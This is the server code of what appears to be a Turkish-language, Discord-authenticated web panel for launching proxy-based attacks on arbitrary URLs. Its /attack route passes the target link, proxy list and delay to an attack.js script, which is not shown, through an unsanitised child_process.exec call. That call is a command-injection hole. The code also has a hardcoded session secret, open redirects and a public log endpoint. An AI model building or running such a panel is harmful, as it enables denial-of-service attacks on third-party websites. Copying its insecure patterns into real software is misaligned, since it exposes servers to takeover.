"use strict";
const express = require("express");
const app = express();
const path = require("path");
const bodyParser = require("body-parser");
const session = require("express-session");
const fs = require("fs");
const child_process = require("child_process");
const { JsonDatabase } = require("wio.db");
const db = new JsonDatabase({ databasePath: "./database.json" });
const DiscordStrategy = require("passport-discord").Strategy;
const passport = require("passport");
const discord = require('discord.js');
const client = new discord.Client();
client.login(process.env.discordToken);
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));
app.listen(process.env.PORT);
app.use(
  session({
    secret: "herorahim",
    resave: false,
    saveUninitialized: true
  })
);
passport.serializeUser((user, done) => done(null, user));
passport.deserializeUser((obj, done) => done(null, obj));
app.use(passport.initialize()).use(passport.session());
passport.use(
  new DiscordStrategy(
    {
      clientID: "",
      clientSecret: "",
      callbackURL: ``,
      scope: ["identify"]
    },
    (accessToken, refreshToken, profile, done) => {
      process.nextTick(() => done(null, profile));
    }
  )
);

const makeid = length => {
  let text = "";
  const possible = "0123456789";

  for (let i = 0; i < length; i += 1) {
    text += possible.charAt(Math.floor(Math.random() * possible.length));
  }
  return text;
};

const permToText = (global.permToText = permLevel => {
  var permText = "";

  if (permLevel == 0) {
    permText = "Owner";
  } else if (permLevel == 1) {
    permText = "Admin";
  } else if (permLevel == 2) {
    permText = "Perm+";
  } else if (permLevel == 3) {
    permText = "Perm";
  } else if (permLevel == 4) {
    permText = "Member";
  }

  return permText;
});

const textToPerm = (global.textToPerm = permText => {
  permText = permText.toLowerCase();
  var permLevel = "";

  if (permText == "owner") {
    permLevel = 0;
  } else if (permText == "admin") {
    permLevel = 1;
  } else if (permText == "perm+") {
    permLevel = 2;
  } else if (permText == "perm") {
    permLevel = 3;
  } else if (permText == "member") {
    permLevel = 4;
  }

  return permLevel;
});

app.use((req, res, next) => {
  req.isLogin = function() {
    return req.user ? true : false;
  };
  req.isAdmin = function(permLevel = 4) {
    return req.user
      ? db
          .fetch("administrators")
          .some(e => e.id == req.user.id && e.perm <= permLevel)
        ? true
        : false
      : false;
  };
  next();
});

app.get("/", function(req, res) {
  res.render(__dirname + "/index.ejs", {
    req,
    res,
    user: req.isLogin() ? req.user : null,
    db,
    bot: client
  });
});

app.post("/attack", function(req, res) {
  if (!req.isAdmin()) {
    return res.jsonp({ status: 401, message: "Bunu yapmak için yetkin yok!" });
  }

  var { proxys, link, delay } = req.body;

  if (
    !proxys ||
    !link ||
    !delay ||
    typeof delay != "number" ||
    typeof proxys != "object" ||
    proxys.length < 1
  )
    return res.jsonp({ status: 50, message: "Geçersiz değişken girildi!" });

  var id = makeid(10);
  fs.writeFileSync(
    path.join(__dirname, path.join("proxys", `proxy-${id}.txt`)),
    proxys.join("\n")
  );
  child_process.exec(
    `node attack.js ${link} proxy-${id}.txt ${delay}`,
    function(error, stdout, stderr) {
      if (error) throw error;
    }
  );
  log(req.user, 'attack', `Kullanıcı ${proxys.length} proxy ile ${link} sayfasına ${delay} zaman aşımlı saldırı başlattı!`);

  res.jsonp({ status: 200, message: "İşlem başlatıldı!" });
});

app.post("/new-admin", (req, res) => {
  if (!req.isLogin()) {
    return res.jsonp({
      status: 401,
      message: "Bunu yapmak için giriş yapman gerekli!"
    });
  }
  if (!req.isAdmin(1)) {
    return res.jsonp({ status: 401, message: "Bunu yapmak için yetkin yok!" });
  }

  var { userID, permLevel } = req.body;

  if (!userID || !permLevel)
    return res.jsonp({ status: 500, message: "userID ve perm kontrol edin!" });

  client.users.fetch(userID).then(user => db.push("administrators", { id: userID, perm: textToPerm(permLevel), username: user.username + "#" + user.discriminator }));
  log(req.user, 'edit admin', `Kullanıcı ${userID} id'li kullanıcıya yetki verdi!`);

  res.jsonp({ status: 200, message: "İşlem başarılı!" });
});

app.post("/remove-admin", (req, res) => {
  if (!req.isLogin()) {
    return res.jsonp({
      status: 401,
      message: "Bunu yapmak için giriş yapman gerekli!"
    });
  }
  if (!req.isAdmin(0)) {
    return res.jsonp({ status: 401, message: "Bunu yapmak için yetkin yok!" });
  }

  var { userID } = req.body;

  if (!userID)
    return res.jsonp({ status: 500, message: "userID kontrol edin!" });

  var administrators = db.fetch("administrators");

  if (administrators.filter(e => e.id == userID)[0].perm == 0)
    return res.jsonp({ status: 303, message: "Owner'in yetkisini alamazsın!" });

  var e = [];
  administrators.filter(e => e.id != userID).forEach(a => e.push(a));
  db.set("administrators", e);
  log(req.user, 'edit admin', `Kullanıcı ${userID} id'li kullanıcının yetkisini aldı!`);

  res.jsonp({ status: 200, message: "İşlem başarılı!" });
});

app.get(
  "/auth",
  (req, res, next) => {
    req.session.backURL = req.query.redirect ? req.query.redirect : "/";
    next();
  },
  passport.authenticate("discord")
);

app.get(
  "/callback",
  passport.authenticate("discord", { failureRedirect: "/error" }),
  (req, res, next) => {
    var url = req.session.backURL ? req.session.backURL : "/";
    req.session.backURL = null;
    res.redirect(url);
    log(req.user, 'login', '');
  }
);

app.get("/logout", (req, res) => {
  var url = req.query.next ? req.query.next : "/";
  log(req.user, 'logout', '');
  req.user = null;
  req.session.destroy();
  res.redirect(url);
});



function log(user, event, text) {
  var data = {
    userID: user.id,
    text,
    event,
    date: require('moment-timezone').tz('ASIA/ISTANBUL').format('DD/MM/YYYY HH:mm:ss')
  };
  db.push('log', data);
}


app.get("/log", (req, res) => {
  res.json(db.fetch('log'));
});